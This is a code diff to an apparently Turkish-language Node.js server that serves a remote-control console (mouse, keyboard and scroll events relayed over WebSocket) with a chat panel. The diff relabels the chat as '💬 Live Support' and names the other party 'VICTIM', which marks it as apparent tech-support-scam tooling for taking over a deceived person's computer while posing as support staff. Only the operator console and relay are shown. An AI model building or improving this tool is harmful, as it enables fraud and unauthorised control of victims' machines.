@@ -72,7 +72,7 @@ app.get('/', (req, res) => {
         </select>
         <button onclick="sendCmd('WIN')">Win</button>
         <button onclick="sendCmd('TAB')">Alt+Tab</button>
-        <button onclick="toggleChat()" style="background: #1877f2; font-weight: bold;">Chat</button>
+        <button onclick="toggleChat()" style="background: #1877f2; font-weight: bold;">💬 Live Support</button>
         <button onclick="sendCmd('OPEN_CHAT')">Pencereyi Ac</button>
         <button onclick="toggleFs()">⛶</button>
     </div>
@@ -81,7 +81,7 @@ app.get('/', (req, res) => {
 
     <div id="chatBox">
         <div id="chatHeader">
-            <span>Live Support (MUSTERI)</span>
+            <span>Live Support (VICTIM)</span>
             <span style="cursor:pointer; font-size: 14px;" onclick="toggleChat()">✕</span>
         </div>
         <div id="chatMsgs"></div>
@@ -165,7 +165,7 @@ app.get('/', (req, res) => {
         function appendMsg(text, who) {
             const el = document.createElement('div');
             el.className = 'msg ' + (who === 'me' ? 'msg-me' : 'msg-them');
-            el.innerText = (who === 'me' ? 'Sen: ' : 'VICTIM: ') + text;
+            el.innerText = (who === 'me' ? 'Sen: ' : 'Musteri: ') + text;
             chatMsgs.appendChild(el);
             chatMsgs.scrollTop = chatMsgs.scrollHeight;
         }
@@ -209,4 +209,40 @@ app.get('/', (req, res) => {
         });
 
         canvas.addEventListener('mouseup', (e) => {
-            if (e.target.closest('#chatBox') || e
+            if (e.target.closest('#chatBox') || e.target.closest('#nav')) return;
+            isDown = false;
+            const p = pos(e);
+            send('U:' + p.x.toFixed(4) + ':' + p.y.toFixed(4) + ':' + e.button);
+        });
+
+        canvas.addEventListener('wheel', (e) => {
+            e.preventDefault();
+            send('W:' + (e.deltaY > 0 ? 1 : -1));
+        }, { passive: false });
+        canvas.addEventListener('contextmenu', (e) => e.preventDefault());
+
+        window.addEventListener('keydown', (e) => {
+            if (document.activeElement.tagName === 'INPUT') return;
+            send('KD:' + e.keyCode);
+        });
+        window.addEventListener('keyup', (e) => {
+            if (document.activeElement.tagName === 'INPUT') return;
+            send('KU:' + e.keyCode);
+        });
+    </script>
+</body>
+</html>`);
+});
+
+wss.on('connection', (ws) => {
+    ws.on('message', (msg, isBinary) => {
+        wss.clients.forEach(client => {
+            if (client !== ws && client.readyState === WebSocket.OPEN) {
+                client.send(msg, { binary: isBinary });
+            }
+        });
+    });
+});
+
+const PORT = process.env.PORT || 10000;
+server.listen(PORT, () => console.log('Support Remote on ' + PORT));
